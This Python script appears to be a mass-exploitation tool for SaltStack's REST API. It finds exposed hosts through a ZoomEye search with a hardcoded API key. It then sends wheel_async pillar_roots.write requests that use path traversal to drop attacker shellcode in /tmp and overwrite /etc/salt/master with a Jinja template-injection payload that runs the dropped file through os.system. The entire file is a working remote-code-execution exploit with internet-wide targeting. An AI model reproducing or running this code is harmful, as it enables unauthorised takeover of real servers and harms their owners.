import asyncio
from aiohttp import ClientSession
from aiohttp import TCPConnector
import sys
from aiohttp.helpers import set_result
#from pocsuite3.api import Fofa
import zoomeye.sdk as zoome
from zoomeye.sdk import ZoomEye
import yaml
from yaml.loader import FullLoader, Loader
from pocsuite3.lib.utils import random_str

class base():

    async def get(self,url,headers,proxies=None,datas=[],method='p',):
        async with ClientSession(connector=TCPConnector(ssl=False)) as session:
            try:
                if method == 'g':
                    async with session.get(url=url,headers=headers,proxy=proxies,allow_redirects=False) as client:
                        return await client.read()
                else:
                    shuju = ''
                    for data in datas:
                        async with session.post(url=url,headers=headers,data=data,proxy=proxies,allow_redirects=False) as client:
                            shuju +=  ' ' + str(client.status) + ' '  + url
                    return shuju
            except Exception as e:
                print(e,end=' ')
                print(url)


    def do(self):
        header= {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Content-Type': 'application/json'
        }
        proxies={'http':'http://192.168.75.1:8080','https':'http://192.168.0.222:8080'}
        task = []
        self.loop=asyncio.get_event_loop()  
        count=0
        for url in self.target:
                task.append(asyncio.ensure_future(self.get(url=url+'/run',headers=header,datas=self.data,proxies=None)))
                count += 1      
                if count == 20:
                    count = 0
                    result = self.loop.run_until_complete(asyncio.gather(*task))
                    for i in result:
                        print(i)
        if count != 0:
            result = self.loop.run_until_complete(asyncio.gather(*task))
            for i in result:
                print(i)

    def arg(self):
        arg = sys.argv
        if len(arg) == 1:
            return
        for i in arg:
            if '-' in i:
                if i == '-u':
                    self.target.append(arg[arg.index(i)+1])
                elif i == '-page':
                    self.page = arg[arg.index(i)+1]
                elif i == '-s':
                    self.shellcode = arg[arg.index(i)+1]

    def gettarget(self):
        if self.target:
            return 
        zm = ZoomEye(api_key="DCcb9462-f442-9f1a2-e497-aa60094ed41")
        #data = zm.multi_page_search("wheel_async",page=self.page)
        data = zm.dork_search("wheel_async",page=self.page)
        self.target=[]
        for i in data:
            if i['portinfo']['service'] == 'https':
                self.target.append('https://'+ i['ip'] + ':' + str(i['portinfo']['port']))
            else:
                self.target.append('http://' + i['ip'] + ':' + str(i['portinfo']['port']))
        print('[+] target list: ' + self.target)

    def __init__(self) -> None:
        self.target=[]
        self.page=1
        self.arg()
        self.gettarget()
        

        random = random_str()
        print('[+] random: /tmp/' + random)
        self.data=[
            r'''[{"client":"wheel_async","fun":"pillar_roots.write","data":"''' + self.shellcode + r'''","path":"../../../../../../tmp/'''+ random + r'''","token":"132132131213"}]''',
            r'''[{"client":"wheel_async","fun":"pillar_roots.write","data":"rest_cherrypy:\n  port: 8000\n  host: 0.0.0.0\n  disable_ssl: true\nexternal_auth:\n  pam:\nmaster_uri: tcp://127.0.0.1:4505\npassword: sdb://aaaaa/bbbbb?name=1\naaaaa:\n  driver: rest\n  bbbbb:\n    url: \"{{name}}{{().__class__.__bases__[0].__subclasses__()[-2].__init__.__globals__['__builtins__']['eval']('__import__(\\\"os\\\").system(\\\"bash /tmp/''' + random + r'''\\\")')}}\"","path":"../../../../../../../../etc/salt/master","token":"132132131213"}]'''
            ]
        

if __name__ == "__main__":
    #set_trace()
    base = base()
    base.do()
